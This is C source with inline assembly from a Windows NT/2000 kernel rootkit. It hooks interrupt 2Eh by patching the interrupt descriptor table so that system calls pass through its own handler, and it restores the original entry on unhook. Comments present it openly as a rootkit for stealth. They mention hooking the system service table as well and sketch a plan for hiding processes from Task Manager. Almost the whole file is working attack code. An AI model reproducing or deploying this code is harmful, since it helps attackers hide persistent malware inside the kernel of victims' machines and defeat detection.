
#include "rk_driver.h"
#include "rk_interrupt.h"

/* ________________________________________________________________________________
 . Interrupt hooks
 . ---------------
 . The rootkit can hook any interrupt.  This can be highly useful in stealth 
 . technique.  Feel free to experiment with interrupt hooking.  For now, the
 . only interupt we are hooking is interrupt 2Eh.  Interrupt 2Eh is very important
 . to Windows NT/2000 because it is how system services are called.
 .
 . Important note:
 . Although we have hooked int 2Eh, keep in mind that is >NOT< how we are 
 . implementing our kernel call hooks.  We have hooked interrupt 2Eh only to
 . demonstrate how this is done.  You can hook any interrupt that you choose.
 . The rootkit implements the kernel call hooks in an alternative way, that does not
 . actually require an interrupt hook.  Keep in mind that either method will work.
 . As it turns out, it is actually easier to hook the system service table itself,
 . which is queried and dereferenced whenever interrupt 2Eh fires.  So, the rootkit
 . has effectively hooked the system calls in two places - both at the interrupt itself,
 . and then at the system service table.
 * ________________________________________________________________________________ */
DWORD KiRealSystemServiceISR_Ptr; /* the real interrupt 2E handler */


/* _____________________________________________________________________________
 . Interrupt Hook - if you create other hooks you can copy this one to start.
 . _____________________________________________________________________________ */
__declspec(naked) MyKiSystemService()
/* thanks to mad russians */
{
	__asm{
		pushad
		pushfd
		push fs
		mov bx,0x30
		mov fs,bx
		push ds
		push es

		/* all I see are outfits and attitudes
		 * continue criminality
		 * the hidden agenda is some psychic neccesity
		 */

		/* ________________________________________________________
		 * suggestion for hiding procii - still working on this
		 *
		 * taskman appears to make calls in this order:
		 * call number 116, 163, 166, 163, then waits for an object
		 * then 124, 124, 124, then queries each process by calling
		 * NtOpenProcess, NtDuplicateObject, then NtClose.
		 *
		 * ________________________________________________________ */
		pop es
		pop ds
		pop fs
		popfd
		popad

		jmp	KiRealSystemServiceISR_Ptr;
	}
}

/* ________________________________________________________________________________
 . This function replaces the interrupt descriptor.  You can hook any interrupts
 . you choose from this function.  Just make sure you unhook them also!
 . 
 . they to discern between truth and suggestion 
 . they bid for your Id, for your fear of 
 . rejection.
 . ________________________________________________________________________________ */
int HookInterrupts()
{
	IDTINFO idt_info;
	IDTENTRY* idt_entries;
	IDTENTRY* int2e_entry;
	__asm{
		sidt idt_info;
	}

	idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase);

	KiRealSystemServiceISR_Ptr = MAKELONG(idt_entries[NT_SYSTEM_SERVICE_INT].LowOffset,idt_entries[NT_SYSTEM_SERVICE_INT].HiOffset);

	/*******************************************************
	 * Note: we can patch ANY interrupt here
	 * the sky is the limit
	 *******************************************************/
	int2e_entry = &(idt_entries[NT_SYSTEM_SERVICE_INT]);

	__asm{
		cli;
		lea eax,MyKiSystemService;
		mov ebx, int2e_entry;
		mov [ebx],ax;
		shr eax,16
		mov [ebx+6],ax;

		lidt idt_info;
		sti;
	}
	return 0;
}

/* _______________________________________________________________________________
 . What is hooked must be unhooked ;-)
 . _______________________________________________________________________________ */
int UnhookInterrupts()
{
	IDTINFO idt_info;
	IDTENTRY* idt_entries;
	IDTENTRY* int2e_entry;

	__asm{
		sidt idt_info;
	}

	idt_entries = (IDTENTRY*) MAKELONG(idt_info.LowIDTbase,idt_info.HiIDTbase);

	int2e_entry = &(idt_entries[NT_SYSTEM_SERVICE_INT]);

	__asm{
		cli;
		mov eax,KiRealSystemServiceISR_Ptr;
		mov ebx, int2e_entry;
		mov [ebx],ax;
		shr eax,16
		mov [ebx+6],ax;


		lidt idt_info;
		sti;
	}
	return 0;
}
